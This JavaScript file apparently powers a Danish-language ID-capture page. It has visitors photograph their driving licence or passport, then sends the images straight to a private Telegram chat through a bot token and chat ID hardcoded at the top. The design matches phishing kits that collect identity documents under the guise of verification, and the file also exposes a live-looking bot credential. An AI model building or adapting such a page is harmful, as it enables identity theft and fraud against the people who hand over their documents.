// ==========================================
// TELEGRAM CONFIGURATION
// Replace with your actual Bot Token & Chat ID
// ==========================================
const BOT_TOKEN = '9229222800:AAHtE7pTM3VLpZlk4nP5wIM6XvhVVtX0Tr8';
const CHAT_ID = '8127526062';

let currentDocType = 'license';
let requiredPages = 2;
let capturedImages = [];
let videoStream = null;
let currentFacingMode = 'environment'; 
let pendingDataUrl = null;

document.addEventListener('DOMContentLoaded', () => {
  const qrContainer = document.getElementById("qrcode");
  if (qrContainer) {
    new QRCode(qrContainer, {
      text: window.location.href,
      width: 120,
      height: 120,
      colorDark: "#0f172a",
      colorLight: "#ffffff",
      correctLevel: QRCode.CorrectLevel.H
    });
  }
});

function selectDoc(type) {
  currentDocType = type;
  requiredPages = (type === 'license') ? 2 : 1;
  capturedImages = [];
  pendingDataUrl = null;
  
  document.querySelectorAll('.doc-card').forEach(card => card.classList.remove('border-blue-500', 'ring-2', 'ring-blue-500/50'));
  document.getElementById(`card-${type}`).classList.add('border-blue-500', 'ring-2', 'ring-blue-500/50');
  
  document.getElementById('step1').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
  
  updateCaptureUI();
  startCamera();
}

function backToSelection() {
  stopCamera();
  document.getElementById('step2').classList.add('hidden');
  document.getElementById('step1').classList.remove('hidden');
}

function updateCaptureUI() {
  const pageNum = capturedImages.length + 1;
  const title = (currentDocType === 'license') 
    ? (pageNum === 1 ? 'Kørekort (Forside)' : 'Kørekort (Bagside)')
    : 'Pas (Fotoside)';
  
  document.getElementById('capture-instruction').innerText = `Tag billede af ${title} (${pageNum} af ${requiredPages})`;
  document.getElementById('progress-dots').innerHTML = Array.from({length: requiredPages}, (_, i) => 
    `<div class="h-2 flex-1 rounded-full ${i < capturedImages.length ? 'bg-blue-500' : 'bg-slate-700'}"></div>`
  ).join('');

  document.getElementById('camera-container').classList.remove('hidden');
  document.getElementById('preview-container').classList.add('hidden');
  document.getElementById('shutter-action-area').classList.remove('hidden');
  document.getElementById('approve-action-area').classList.add('hidden');
  document.getElementById('switch-cam-btn').classList.remove('hidden');
}

async function startCamera() {
  const video = document.getElementById('camera-feed');
  const fallbackInput = document.getElementById('file-input');
  
  try {
    if (videoStream) {
      videoStream.getTracks().forEach(track => track.stop());
    }
    
    videoStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: currentFacingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
    
    video.srcObject = videoStream;
    video.classList.remove('hidden');
    fallbackInput.classList.add('hidden');
  } catch (err) {
    console.warn('Camera fallback to file input:', err);
    video.classList.add('hidden');
    fallbackInput.classList.remove('hidden');
  }
}

function switchCamera() {
  currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
  startCamera();
}

function capturePhoto() {
  const video = document.getElementById('camera-feed');
  const canvas = document.createElement('canvas');
  
  if (!video.classList.contains('hidden') && video.videoWidth > 0) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    pendingDataUrl = canvas.toDataURL('image/jpeg', 0.85);
    showPreviewState(pendingDataUrl);
  } else {
    document.getElementById('file-input').click();
  }
}

function handleFileSelect(event) {
  const file = event.target.files[0];
  if (!file) return;
  
  const reader = new FileReader();
  reader.onload = function(e) {
    pendingDataUrl = e.target.result;
    showPreviewState(pendingDataUrl);
  };
  reader.readAsDataURL(file);
  event.target.value = ''; 
}

function showPreviewState(dataUrl) {
  stopCamera();
  
  document.getElementById('captured-preview-img').src = dataUrl;
  document.getElementById('camera-container').classList.add('hidden');
  document.getElementById('preview-container').classList.remove('hidden');
  document.getElementById('shutter-action-area').classList.add('hidden');
  document.getElementById('approve-action-area').classList.remove('hidden');
  document.getElementById('switch-cam-btn').classList.add('hidden');
}

function retakeCurrentPhoto() {
  pendingDataUrl = null;
  updateCaptureUI();
  startCamera();
}

function approveCurrentPhoto() {
  if (!pendingDataUrl) return;
  
  capturedImages.push(pendingDataUrl);
  pendingDataUrl = null;
  
  if (capturedImages.length < requiredPages) {
    updateCaptureUI();
    startCamera();
  } else {
    stopCamera();
    showReviewScreen();
  }
}

function stopCamera() {
  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
    videoStream = null;
  }
}

function showReviewScreen() {
  document.getElementById('step2').classList.add('hidden');
  document.getElementById('step3').classList.remove('hidden');
  
  const grid = document.getElementById('review-grid');
  grid.innerHTML = capturedImages.map((img, index) => `
    <div class="relative bg-slate-900 rounded-xl overflow-hidden border border-slate-700/80 aspect-[4/3]">
      <img src="${img}" class="w-full h-full object-cover" alt="Optaget dokument ${index + 1}" />
      <span class="absolute bottom-2 left-2 bg-slate-950/80 text-white text-[11px] px-2 py-1 rounded-md backdrop-blur-sm border border-slate-700">
        ${currentDocType === 'license' ? (index === 0 ? 'Forside' : 'Bagside') : 'Pas'}
      </span>
    </div>
  `).join('');
}

function restartCapture() {
  capturedImages = [];
  pendingDataUrl = null;
  document.getElementById('step3').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
  updateCaptureUI();
  startCamera();
}

function dataURLtoBlob(dataurl) {
  const arr = dataurl.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new Blob([u8arr], { type: mime });
}

async function submitDocuments() {
  const btn = document.getElementById('submit-btn');
  const spinner = document.getElementById('loading-spinner');
  const btnText = document.getElementById('submit-text');
  
  btn.disabled = true;
  spinner.classList.remove('hidden');
  btnText.innerText = 'Sender til Telegram...';
  
  const docName = currentDocType === 'license' ? 'Kørekort' : 'Pas';
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  
  try {
    for (let i = 0; i < capturedImages.length; i++) {
      const blob = dataURLtoBlob(capturedImages[i]);
      const formData = new FormData();
      
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, `document_page_${i + 1}.jpg`);
      formData.append('caption', `📷 Nyt dokument modtaget: ${docName} (${i + 1} af ${capturedImages.length})`);
      
      const response = await fetch(url, {
        method: 'POST',
        body: formData
      });
      
      const result = await response.json();
      if (!result.ok) {
        throw new Error(result.description || 'Telegram upload mislykkedes');
      }
    }
    
    document.getElementById('step3').classList.add('hidden');
    document.getElementById('step4').classList.remove('hidden');
  } catch (error) {
    alert(`Fejl ved afsendelse: ${error.message}`);
    btn.disabled = false;
    spinner.classList.add('hidden');
    btnText.innerText = 'Godkend og Send';
  }
}
